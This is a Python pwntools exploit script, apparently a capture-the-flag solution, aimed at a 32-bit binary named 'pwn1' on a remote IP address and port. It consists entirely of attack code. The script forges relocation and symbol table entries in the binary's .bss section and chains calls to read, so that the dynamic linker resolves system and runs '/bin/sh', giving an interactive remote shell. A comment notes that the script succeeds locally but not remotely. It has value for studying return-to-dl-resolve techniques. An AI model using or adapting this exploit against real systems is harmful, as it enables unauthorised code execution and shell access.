from pwn import *
import time
#Spawn shell successfully on local but remote
#p=process('./pwn1')
p=remote('115.28.241.138','9000')
e=ELF('./pwn1')
addesp=0x0804839a
read=0x80483B0
dynsym=e.get_section_by_name('.dynsym')['sh_addr']
dynstr=e.get_section_by_name('.dynstr')['sh_addr']
gnuver=e.get_section_by_name('.gnu.version')['sh_addr']
relplt=e.get_section_by_name('.rel.plt')['sh_addr']
plt=e.get_section_by_name('.plt')['sh_addr']
bss=e.get_section_by_name('.bss')['sh_addr']
base=bss+0x100
stack=bss+0x500
index=base-relplt+8
sym_start=base+16
align= 0x10 - ((sym_start - dynsym) & 0xf)
sym_start+=align
index_sym=(sym_start-dynsym)/16
ver=gnuver+index_sym*2
v=e.read(ver,2)
while(v!='\x00'*2):
	index_sym+=1
	ver=gnuver+index_sym*2
	v=e.read(ver,2)
print '[+] Found index:{}'.format(hex(index_sym))
print '[+] gnuver:'+hex(ver)
sym=index_sym*16+dynsym
align+=sym-sym_start
r_info=(index_sym<<8)|0x7
reloc=p32(base+16)+p32(r_info)
stname=sym+16-dynstr
fakesym=p32(stname)+p32(0)+p32(0)+p32(0x12)
p.recv()
#raw_input()
i=0x30
p.sendline('134514276.'+str(134520954)+'.134514282A'+p32(read)+p32(addesp)+p32(0)+p32(stack)+p32(256)+p32(0x804866A)+p32(stack-0x4)+p32(0x8048664))
time.sleep(0.2)
p.sendline(p32(read)+p32(addesp)+p32(0)+p32(base)+p32(256)+p32(plt)+p32(index)+p32(0)+p32(base))
time.sleep(0.5)
#raw_input()
p.sendline('/bin/sh\x00'+reloc+align*'\xcc'+fakesym+'system\x00')
p.interactive()
